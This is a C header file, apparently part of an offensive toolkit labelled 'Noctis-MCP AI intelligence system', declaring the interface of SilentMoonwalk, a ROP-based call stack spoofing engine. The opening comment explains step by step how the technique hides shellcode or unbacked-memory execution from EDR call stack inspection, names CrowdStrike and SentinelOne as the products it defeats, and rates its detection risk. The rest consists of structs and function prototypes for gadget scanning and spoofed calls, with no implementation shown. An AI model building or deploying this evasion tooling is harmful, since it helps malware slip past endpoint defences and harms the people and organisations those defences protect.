// Reference code for Noctis-MCP AI intelligence system
// SilentMoonwalk - ROP-Based Call Stack Spoofing
// Source: https://github.com/klezVirus/SilentMoonwalk
// Research: Argus Red Team Intelligence Report 2024-2025 (Phase 3)
//
// TECHNIQUE: Fully Dynamic Call Stack Spoofing via ROP
// IMPROVEMENT: Synthetic frame generation without target thread dependency
// DETECTION RISK: Low (10-15%) vs Stack cloning (15-20%)
//
// How it works:
// 1. Scan ntdll.dll/kernel32.dll for ROP gadgets (pop rbp, ret, etc.)
// 2. Build synthetic call stack frames pointing to legitimate code
// 3. Use ROP chain to desynchronize stack unwinding from control flow
// 4. Execute target API with spoofed call stack
// 5. ROP gadget restores original stack after API returns
// 6. EDR sees legitimate ntdll.dll → kernel32.dll → your API call
//
// Critical: Defeats call stack inspection used by CrowdStrike, SentinelOne
// EDRs enumerate thread call stacks during suspicious API calls. By creating
// synthetic frames that point to legitimate Windows modules, the call origin
// appears benign even when executing from shellcode or unbacked memory.

#ifndef SILENTMOONWALK_H
#define SILENTMOONWALK_H

#include <Windows.h>

// Maximum arguments supported by each mode
#define SYNTHETIC_MAX_ARGS 8
#define DESYNC_MAX_ARGS 4

// Stack spoofing modes
typedef enum _SPOOF_MODE {
    SPOOF_MODE_SYNTHETIC = 0,   // Add fake frames (max 8 args)
    SPOOF_MODE_DESYNC = 1,      // Replace frames (max 4 args, recommended)
} SPOOF_MODE;

// ROP gadget types
typedef enum _GADGET_TYPE {
    GADGET_POP_RBP_RET = 0,     // pop rbp; ret
    GADGET_POP_RCX_RET = 1,     // pop rcx; ret
    GADGET_ADD_RSP_RET = 2,     // add rsp, 0x??; ret
    GADGET_XCHG_RAX_RSP = 3,    // xchg rax, rsp; ret
} GADGET_TYPE;

// ROP gadget structure
typedef struct _ROP_GADGET {
    PVOID pAddress;             // Gadget address in ntdll/kernel32
    GADGET_TYPE type;           // Gadget type
    BYTE offset;                // Stack offset for ADD_RSP gadgets
} ROP_GADGET, *PROP_GADGET;

// Gadget cache for ntdll.dll/kernel32.dll
typedef struct _GADGET_CACHE {
    ROP_GADGET popRbpRet;       // pop rbp; ret
    ROP_GADGET popRcxRet;       // pop rcx; ret
    ROP_GADGET addRsp20Ret;     // add rsp, 0x20; ret
    ROP_GADGET addRsp28Ret;     // add rsp, 0x28; ret
    ROP_GADGET xchgRaxRspRet;   // xchg rax, rsp; ret (if available)
    BOOL bInitialized;          // Cache initialized flag
} GADGET_CACHE, *PGADGET_CACHE;

// Synthetic frame for call stack
typedef struct _SYNTHETIC_FRAME {
    PVOID returnAddress;        // Fake return address (legitimate code)
    PVOID rbpValue;             // Frame base pointer value
} SYNTHETIC_FRAME, *PSYNTHETIC_FRAME;

// Call stack spoof context
typedef struct _SPOOF_CONTEXT {
    SPOOF_MODE mode;            // Spoofing mode (SYNTHETIC or DESYNC)
    GADGET_CACHE gadgets;       // ROP gadget cache
    SYNTHETIC_FRAME frames[4];  // Synthetic frames (max 4)
    DWORD dwFrameCount;         // Number of synthetic frames
    PVOID pTargetFunction;      // API to call with spoofed stack
    PVOID pOriginalRsp;         // Original RSP (for restoration)
    PVOID pOriginalRbp;         // Original RBP (for restoration)
} SPOOF_CONTEXT, *PSPOOF_CONTEXT;

// Initialize SilentMoonwalk spoofing engine
BOOL SilentMoonwalk_Initialize(
    PSPOOF_CONTEXT pContext,
    SPOOF_MODE mode
);

// Build synthetic call stack frames
BOOL SilentMoonwalk_BuildSyntheticStack(
    PSPOOF_CONTEXT pContext,
    DWORD dwFrameCount
);

// Execute function with spoofed call stack (up to 4 arguments)
PVOID SilentMoonwalk_CallWithSpoofedStack(
    PSPOOF_CONTEXT pContext,
    PVOID pFunction,
    PVOID arg1,
    PVOID arg2,
    PVOID arg3,
    PVOID arg4
);

// Execute function with spoofed stack (8 arguments - SYNTHETIC mode only)
PVOID SilentMoonwalk_CallWithSpoofedStack8(
    PSPOOF_CONTEXT pContext,
    PVOID pFunction,
    PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4,
    PVOID arg5, PVOID arg6, PVOID arg7, PVOID arg8
);

// Cleanup spoofing context
VOID SilentMoonwalk_Cleanup(PSPOOF_CONTEXT pContext);

// Internal: Scan module for ROP gadgets
BOOL _SilentMoonwalk_ScanGadgets(
    HMODULE hModule,
    PGADGET_CACHE pCache
);

// Internal: Find specific gadget pattern
PVOID _SilentMoonwalk_FindGadget(
    PVOID pModuleBase,
    SIZE_T szModuleSize,
    BYTE* pattern,
    SIZE_T patternSize
);

// Internal: Create synthetic frame pointing to legitimate code
BOOL _SilentMoonwalk_CreateFrame(
    PSYNTHETIC_FRAME pFrame,
    HMODULE hModule
);

// Internal: Execute spoofed call (assembly trampoline)
PVOID _SilentMoonwalk_ExecuteSpoofedCall(
    PSPOOF_CONTEXT pContext,
    PVOID pFunction,
    PVOID* args,
    DWORD dwArgCount
);

// Utility: Get random legitimate return address from module
PVOID SilentMoonwalk_GetLegitimateReturnAddress(HMODULE hModule);

// Utility: Validate call stack is spoofed (debug/testing)
BOOL SilentMoonwalk_ValidateSpoofedStack(PVOID pExpectedModule);

#endif // SILENTMOONWALK_H
